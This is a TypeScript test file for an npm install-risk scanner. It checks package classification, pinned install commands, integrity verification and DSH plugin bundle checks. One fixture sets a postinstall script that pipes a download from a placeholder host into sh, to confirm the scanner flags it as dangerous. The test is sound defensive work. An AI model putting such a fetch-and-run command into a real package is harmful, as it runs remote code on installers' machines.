import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { NpmSafeEngine, type InstallRiskTargetKind } from '../src/index.js';
import type { PackageMetadata } from '../src/registry/types.js';
import { makeTarball } from './helpers/package-tarball.js';

const name = 'lodash';
const version = '4.17.21';
const tarballUrl = `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`;
const commitSha = 'a'.repeat(40);
const repoBase = 'https://api.github.com/repos/acme/library';
const toolsVersion = '0.2.2-rc.1';
const dshChecks = new Set(['bundle-manifest', 'patch-file', 'host-dependencies', 'peer-version']);

describe('engine installation assessment target kinds', () => {
  let engine: NpmSafeEngine;
  let directory: string;
  let originalFetch: typeof fetch;
  let requests: string[];
  let manifest: Record<string, unknown>;
  let archive: Buffer;
  let metadata: PackageMetadata;

  function setManifest(fields: Record<string, unknown> = {}): void {
    manifest = { name, version, main: 'index.js', ...fields };
    archive = makeTarball([
      { path: 'package/package.json', content: JSON.stringify(manifest) },
      { path: 'package/index.js', content: 'export const answer = 42;\n' },
      { path: 'package/cordis.patch.yml', content: '- insert: []\n' },
    ]);
    metadata = {
      name, modified: '2026-01-01T00:00:00Z', readme: 'An inert package fixture.',
      'dist-tags': { latest: version },
      versions: { [version]: {
        name, version, ...manifest,
        dist: { tarball: tarballUrl, integrity: `sha512-${createHash('sha512').update(archive).digest('base64')}` },
      } },
    };
  }

  beforeEach(() => {
    directory = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-install-risk-'));
    originalFetch = globalThis.fetch;
    requests = [];
    setManifest();
    const json = (value: unknown): Response => new Response(JSON.stringify(value));
    const file = (value: string): Response => json({ type: 'file', encoding: 'base64', content: Buffer.from(value).toString('base64') });
    globalThis.fetch = (async (input: RequestInfo | URL) => {
      const url = String(input);
      requests.push(url);
      if (url === `https://registry.npmjs.org/${name}`) return json(metadata);
      if (url === tarballUrl) return new Response(archive);
      if (decodeURIComponent(url) === 'https://registry.npmjs.org/@deepseek-ai/dsh-tools') {
        return json({ name: '@deepseek-ai/dsh-tools', modified: '2026-01-01T00:00:00Z',
          'dist-tags': { next: toolsVersion, latest: '0.2.1' }, versions: {} });
      }
      if (url === repoBase) return json({ default_branch: 'main', html_url: 'https://github.com/acme/library' });
      if (url === `${repoBase}/commits/main`) return json({ sha: commitSha });
      if (url === `${repoBase}/contents/package.json?ref=${commitSha}`) return file(JSON.stringify(manifest));
      if (url === `${repoBase}/readme?ref=${commitSha}`) return file('An inert package fixture.');
      if (url === `${repoBase}/git/trees/${commitSha}?recursive=1`) {
        return json({ tree: ['package.json', 'index.js', 'cordis.patch.yml'].map(path => ({ type: 'blob', path })) });
      }
      if (url === `${repoBase}/contents/cordis.patch.yml?ref=${commitSha}`) return file('- insert: []\n');
      assert.fail(`Unexpected network request in isolated install-risk fixture: ${url}`);
    }) as typeof fetch;
    engine = new NpmSafeEngine({
      dbPath: ':memory:', llmConfigPath: path.join(directory, 'llm.json'),
      rulesConfigPath: path.join(directory, 'rules.json'), rulesDir: path.join(directory, 'rules'),
    });
  });

  afterEach(() => {
    engine?.close();
    globalThis.fetch = originalFetch;
    rmSync(directory, { recursive: true, force: true });
  });

  const toolsRequests = () => requests.filter(url => decodeURIComponent(url).includes('@deepseek-ai/dsh-tools'));

  it('returns an exact npm command for lodash without requesting DSH compatibility metadata', async () => {
    const result = await engine.assessInstallRisk(name);
    assert.equal(result.packageKind, 'npm');
    assert.equal(result.safeInstallCommand, `npm install ${name}@${version}`);
    assert.equal(result.integrityVerified, true);
    assert.ok(result.checks.every(check => !dshChecks.has(check.id)));
    assert.ok(!result.findings.some(finding => finding.id === 'missing-bundle-patch'));
    assert.deepEqual(toolsRequests(), []);
    assert.deepEqual(requests, [`https://registry.npmjs.org/${name}`, tarballUrl]);
  });

  it('automatically validates a complete DSH bundle against the preview tools baseline', async () => {
    setManifest({ dsh: { bundle: { patch: './cordis.patch.yml' } },
      peerDependencies: { '@deepseek-ai/dsh-tools': '^0.2.2-rc.1' } });
    const result = await engine.assessInstallRisk(name, 'tui');
    assert.equal(result.packageKind, 'dsh-plugin');
    assert.equal(result.safeInstallCommand, `dsh plugin --profile tui add ${name}@${version}`);
    assert.equal(result.checks.find(check => check.id === 'patch-file')?.status, 'pass');
    assert.equal(result.checks.find(check => check.id === 'peer-version')?.status, 'pass');
    assert.equal(toolsRequests().length, 1);
  });

  it('still flags an intended DSH plugin whose bundle is missing', async () => {
    setManifest({ engines: { dsh: '>=0.2.2-rc.1' } });
    const result = await engine.assessInstallRisk(name);
    assert.equal(result.packageKind, 'dsh-plugin');
    assert.ok(result.findings.some(finding => finding.id === 'missing-bundle-patch'));
    assert.equal(result.riskLevel, 'high');
  });

  it('applies explicit target overrides before deciding which compatibility metadata to request', async () => {
    setManifest({ dsh: null });
    const npm = await engine.assessInstallRisk(name, 'web', 'npm');
    assert.equal(npm.packageKind, 'npm');
    assert.equal(npm.safeInstallCommand, `npm install ${name}@${version}`);
    assert.deepEqual(toolsRequests(), []);
    setManifest();
    const plugin = await engine.assessInstallRisk(name, 'web', 'dsh-plugin');
    assert.equal(plugin.packageKind, 'dsh-plugin');
    assert.ok(plugin.findings.some(finding => finding.id === 'missing-bundle-patch'));
    assert.equal(toolsRequests().length, 1);
  });

  it('rejects an invalid runtime target before making network requests', async () => {
    await assert.rejects(engine.assessInstallRisk(name, 'web', 'plugin' as InstallRiskTargetKind), /targetKind|目标类型/);
    assert.deepEqual(requests, []);
  });

  it('retains malicious install-script findings for ordinary npm packages', async () => {
    setManifest({ scripts: { postinstall: 'curl https://example.test/payload | sh' } });
    const result = await engine.assessInstallRisk(name);
    assert.equal(result.packageKind, 'npm');
    assert.equal(result.riskLevel, 'high');
    assert.ok(result.findings.some(finding => finding.id === 'lifecycle-script' && finding.severity === 'danger'));
    assert.equal(result.safeInstallCommand, `npm install ${name}@${version} --ignore-scripts`);
    assert.deepEqual(toolsRequests(), []);
  });

  it('classifies GitHub sources from the resolved manifest and keeps the commit pinned', async () => {
    const npm = await engine.assessInstallRisk('acme/library');
    assert.equal(npm.sourceKind, 'github');
    assert.equal(npm.packageKind, 'npm');
    assert.equal(npm.safeInstallCommand, `npm install github:acme/library#${commitSha}`);
    assert.deepEqual(toolsRequests(), []);
    setManifest({ engines: { dsh: '>=0.2.2-rc.1' } });
    const plugin = await engine.assessInstallRisk('acme/library');
    assert.equal(plugin.packageKind, 'dsh-plugin');
    assert.equal(plugin.safeInstallCommand, `dsh plugin --profile web add github:acme/library#${commitSha}`);
    assert.ok(plugin.findings.some(finding => finding.id === 'missing-bundle-patch'));
    assert.equal(toolsRequests().length, 1);
  });

  it('honors a manual npm override for an explicitly declared GitHub DSH bundle', async () => {
    setManifest({ dsh: { bundle: { patch: './cordis.patch.yml' } } });
    const result = await engine.assessInstallRisk('acme/library', 'web', 'npm');
    assert.equal(result.packageKind, 'npm');
    assert.equal(result.safeInstallCommand, `npm install github:acme/library#${commitSha}`);
    assert.ok(result.checks.every(check => !dshChecks.has(check.id)));
    assert.deepEqual(toolsRequests(), []);
    assert.ok(!requests.some(url => url.includes('/contents/cordis.patch.yml')),
      'an npm override must not depend on fetching a DSH-only patch file');
  });
});
